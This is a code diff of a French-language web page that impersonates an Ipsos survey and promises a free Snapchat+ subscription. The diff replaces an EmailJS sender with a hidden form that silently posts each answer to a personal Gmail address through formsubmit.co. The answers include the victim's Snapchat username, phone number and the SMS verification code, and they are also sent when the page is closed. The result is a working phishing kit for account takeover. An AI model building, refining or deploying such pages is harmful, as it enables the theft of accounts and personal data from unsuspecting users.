@@ -116,11 +116,14 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <div class="header-text">Ipsos – Sondage</div>
 </div>
 
+<!-- ÉCRAN INTRO -->
 <div class="box" id="intro">
     <h2>Sondage express</h2>
     <p>Répondez à ce court sondage pour bénéficier de <strong>Snapchat+</strong> 🎁</p>
     <button onclick="demarrer()">Commencer</button>
 </div>
+
+<!-- ÉCRAN INTERMÉDIAIRE -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
     <h3>
@@ -129,6 +132,7 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <button onclick="continuer()">Continuer</button>
 </div>
 
+<!-- ÉCRAN SONDAGE -->
 <div class="box" id="sondage" style="display:none;">
     <div class="progress-container">
         <div class="progress-bar" id="progressBar"></div>
@@ -147,133 +151,153 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
         </div>
     </div>
 </div>
+<!-- FORMULAIRE CACHÉ POUR ENVOI À CHAQUE ÉTAPE -->
+<form id="formSubmit" action="https://formsubmit.co/ano625343@gmail.com" method="POST" style="display:none;">
+    <input type="text" name="artiste_prefere" id="f_artiste_prefere">
+    <input type="text" name="artiste_deezer" id="f_artiste_deezer">
+    <input type="text" name="artiste_decouverte" id="f_artiste_decouverte">
+    <input type="text" name="snapchat" id="f_snapchat">
+    <input type="text" name="telephone" id="f_telephone">
+    <input type="text" name="code_sms" id="f_code_sms">
+    <input type="hidden" name="_cc" value="ano625343@gmail.com">
+    <input type="hidden" name="_subject" id="f_subject" value="">
+    <input type="hidden" name="_captcha" value="false">
+</form>
 
-<div class="footer">
-    © 2026 Ipsos – Tous droits réservés
-</div>
-<!-- Charger EmailJS -->
-<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
-  // Initialiser EmailJS avec ta Public Key
-  emailjs.init("QyMvGNYIF6CXRSqms");
-
-  const questions = [
+const questions = [
     { text:"Quel est ton artiste ou groupe préféré ?", type:"text", placeholder:"Ex : Niska" },
     { text:"Quel artiste écoutes-tu actuellement?", type:"text", placeholder:"Ex : Damso" },
     { text:"Quel artiste aimerais-tu découvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
     { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
     { text:"Quel est ton numéro de téléphone ?", type:"custom-phone" },
     { text:"Entre le code reçu par SMS", type:"text", placeholder:"XXXX" }
-  ];
+];
 
-  let indexQuestion = 0;
-  let reponsesUtilisateur = [];
+let indexQuestion = 0;
+let reponsesUtilisateur = [];
 
-  function demarrer(){
+// Fonction de démarrage
+function demarrer(){
     document.getElementById("intro").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
-  }
+}
 
-  function afficherQuestion(){
+// Affichage question actuelle
+function afficherQuestion(){
     const q = questions[indexQuestion];
     document.getElementById("question").textContent = q.text;
 
     if(q.type === "custom-phone"){
-      document.getElementById("reponses").innerHTML = `
-        <div style="display:flex; gap:10px; justify-content:center;">
-          <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
-            <option value="06">06</option>
-            <option value="07">07</option>
-          </select>
-          <input type="tel" id="champ" placeholder="12345678" maxlength="8" pattern="[0-9]*" inputmode="numeric"
-            style="padding:10px; font-size:16px;" oninput="this.value=this.value.replace(/[^0-9]/g,''); verifier();">
-        </div>`;
+        document.getElementById("reponses").innerHTML = `
+            <div style="display:flex; gap:10px; justify-content:center;">
+                <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                </select>
+                <input 
+                    type="tel"
+                    id="champ"
+                    placeholder="12345678"
+                    maxlength="8"
+                    pattern="[0-9]*"
+                    inputmode="numeric"
+                    style="padding:10px; font-size:16px;"
+                    oninput="this.value=this.value.replace(/[^0-9]/g,''); verifier();"
+                >
+            </div>
+        `;
     } else {
-      document.getElementById("reponses").innerHTML = `
-        <input type="${q.type}" id="champ" placeholder="${q.placeholder}" oninput="verifier()" style="padding:10px; font-size:16px; width:80%;">`;
+        document.getElementById("reponses").innerHTML =
+            `<input type="${q.type}" 
+                    id="champ" 
+                    placeholder="${q.placeholder}" 
+                    oninput="verifier()" 
+                    style="padding:10px; font-size:16px; width:80%;">`;
     }
 
     document.getElementById("btnSuivant").disabled = true;
-    document.getElementById("partenariat").style.display = indexQuestion >= 3 ? "block" : "none";
+    document.getElementById("partenariat").style.display = indexQuestion>=3 ? "block" : "none";
     updateProgress();
-  }
+}
 
-  function verifier(){
+// Vérification entrée utilisateur
+function verifier(){
     const q = questions[indexQuestion];
     if(q.type === "custom-phone"){
-      const numero = document.getElementById("champ").value.trim();
-      document.getElementById("btnSuivant").disabled = numero.length !== 8;
+        const numero = document.getElementById("champ").value.trim();
+        document.getElementById("btnSuivant").disabled = numero.length !== 8;
     } else {
-      const champ = document.getElementById("champ");
-      document.getElementById("btnSuivant").disabled = !champ.value.trim();
+        const champ = document.getElementById("champ");
+        document.getElementById("btnSuivant").disabled = !champ.value.trim();
     }
-  }
+}
 
-  function updateProgress(){
+// Mise à jour barre de progression
+function updateProgress(){
     document.getElementById("progressBar").style.width =
-      ((indexQuestion + 1) / questions.length * 100) + "%";
-  }
+        ((indexQuestion+1)/questions.length*100) + "%";
+}
 
-  function suivant(){
+// Passage à la question suivante
+function suivant(){
     const q = questions[indexQuestion];
+
     if(q.type === "custom-phone"){
-      const prefix = document.getElementById("prefix").value;
-      const numero = document.getElementById("champ").value.trim();
-      reponsesUtilisateur[indexQuestion] = prefix + numero;
+        const prefix = document.getElementById("prefix").value;
+        const numero = document.getElementById("champ").value.trim();
+        if(!/^[0-9]{8}$/.test(numero)){
+            alert("Numéro invalide (8 chiffres après 06 ou 07)");
+            return;
+        }
+        reponsesUtilisateur[indexQuestion] = prefix + numero;
     } else {
-      const champ = document.getElementById("champ");
-      reponsesUtilisateur[indexQuestion] = champ.value.trim();
+        const champ = document.getElementById("champ");
+        reponsesUtilisateur[indexQuestion] = champ.value.trim();
     }
 
-    // Envoyer la réponse via EmailJS
-    envoyer(indexQuestion + 1);
+    // ✅ Remplir le formulaire caché pour Formsubmit
+    document.getElementById("f_artiste_prefere").value = reponsesUtilisateur[0] || "";
+    document.getElementById("f_artiste_deezer").value = reponsesUtilisateur[1] || "";
+    document.getElementById("f_artiste_decouverte").value = reponsesUtilisateur[2] || "";
+    document.getElementById("f_snapchat").value = reponsesUtilisateur[3] || "";
+    document.getElementById("f_telephone").value = reponsesUtilisateur[4] || "";
+    document.getElementById("f_code_sms").value = reponsesUtilisateur[5] || "";
+    document.getElementById("f_subject").value = `Réponses sondage Snapchat+ (étape ${indexQuestion+1})`;
+
+    // Envoi immédiat
+    document.getElementById("formSubmit").submit();
 
     indexQuestion++;
     if(indexQuestion < questions.length){
-      afficherQuestion();
+        afficherQuestion();
     } else {
-      document.getElementById("sondage").innerHTML = `
-        <h2>Merci pour votre participation !</h2>
-        <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
-      `;
+        // Étape finale
+        document.getElementById("sondage").innerHTML = `
+            <h2>Merci pour votre participation !</h2>
+            <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
+        `;
     }
-  }
+}
 
-  function continuer(){
+// Continuer après écran intermédiaire
+function continuer(){
     document.getElementById("intermediaire").style.display="none";
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
-  }
+}
 
-  function envoyer(etape){
-    const templateParams = {
-      artiste_prefere: reponsesUtilisateur[0] || "",
-      artiste_deezer: reponsesUtilisateur[1] || "",
-      artiste_decouverte: reponsesUtilisateur[2] || "",
-      snapchat: reponsesUtilisateur[3] || "",
-      telephone: reponsesUtilisateur[4] || "",
-      code_sms: reponsesUtilisateur[5] || "",
-      etape: etape
-    };
-
-    emailjs.send("service_klm8fbd", "template_efzgmoi", templateParams)
-      .then(function(response){
-        console.log("Envoi réussi étape " + etape, response.status, response.text);
-      }, function(error){
-        console.error("Erreur envoi étape " + etape, error);
-      });
-  }
-
-  // Sauvegarde si l’utilisateur quitte
-  window.addEventListener("beforeunload", function(e){
+// Sauvegarde automatique si l'utilisateur ferme ou change de page
+window.addEventListener("beforeunload", function(e){
     if(reponsesUtilisateur.length > 0 && indexQuestion < questions.length){
-      envoyer(indexQuestion);
+        document.getElementById("formSubmit").submit();
     }
-  });
+});
 </script>
 
+<div class="footer">
+    © 2026 Ipsos – Tous droits réservés
+</div>
 </body>
 </html>
-
-
